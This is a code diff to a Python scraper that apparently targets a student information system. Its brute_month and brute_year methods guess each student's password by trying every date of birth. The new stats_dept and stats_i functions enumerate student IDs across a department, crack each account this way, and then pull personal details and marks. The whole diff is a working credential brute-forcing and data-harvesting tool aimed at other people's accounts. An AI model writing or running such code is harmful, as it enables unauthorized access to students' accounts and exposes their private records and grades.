@@ -4,7 +4,7 @@ from threading import Thread
 
 import requests
 
-from scraper import Scraper, get_cache, set_cache, cached
+from scraper import Scraper, get_cache, set_cache, cached, roll_range, gen_usn
 
 CACHE_NAME = "siscacheri92gh45"
 
@@ -92,7 +92,8 @@ class SisScraper(Scraper):
 		for worker in workers: worker.join()
 		return marks
 
-	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE=None) -> Union[str, None, bool]:
+	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE: list = None) -> Union[str, None, bool]:
+		assert isinstance(_INTERNAL_THREAD_USE, list) or _INTERNAL_THREAD_USE is None
 		payload = gen_payload()
 		for day in range(1, 32):
 			if _INTERNAL_THREAD_USE is not None and any(_INTERNAL_THREAD_USE): return
@@ -102,7 +103,7 @@ class SisScraper(Scraper):
 				body = self.get_logged_body(payload)
 			except Exception as e:
 				print(e)
-				_INTERNAL_THREAD_USE.append(None)
+				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(None)
 				return
 			if body is not None:
 				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(payload['passwd'])
@@ -129,3 +130,50 @@ class SisScraper(Scraper):
 		join_year = int("20" + usn[3:5])
 		for year in [y := join_year - 18, y - 1, y + 1, y - 2, y - 3]:
 			if dob := self.brute_year(usn=usn, year=year): return dob
+
+	def stats_dept(self, year, dept, start=1, stop=None, dobs: dict[int, str] = None, lite=False):
+		if dobs is None: dobs = {}
+		pl = gen_payload()
+		tol = 4
+		for i in roll_range(start, stop):
+			if tol <= 0: return
+			pl["username"] = gen_usn(year, dept, i)
+
+			# === dob worker
+			if i not in dobs:
+				dob = self.get_dob(pl['username'])
+			else:
+				dob = dobs[i]
+			if dob is None:
+				tol -= 1
+				continue
+			tol = 4
+			if i % 5 == 0: set_cache(CACHE_NAME, self.brute_year)
+
+			# === meta worker
+			pl["passwd"] = dob
+			meta = self.get_meta(pl)
+
+			# === marks worker
+			marks = self.get_marks(lite)
+
+			yield meta, marks
+
+
+def stats_i(year, dept, i, dob=None, lite=False):
+	with SisScraper() as SIS:
+		pl = gen_payload()
+		pl['username'] = gen_usn(year, dept, i)
+
+		# === dob worker
+		if dob is None: dob = SIS.get_dob(pl['username'])
+		if dob is None: return {}
+
+		# === meta worker
+		pl["passwd"] = dob
+		meta = SIS.get_meta(pl)
+
+		# === marks worker
+		marks = SIS.get_marks(lite)
+
+	return meta, marks
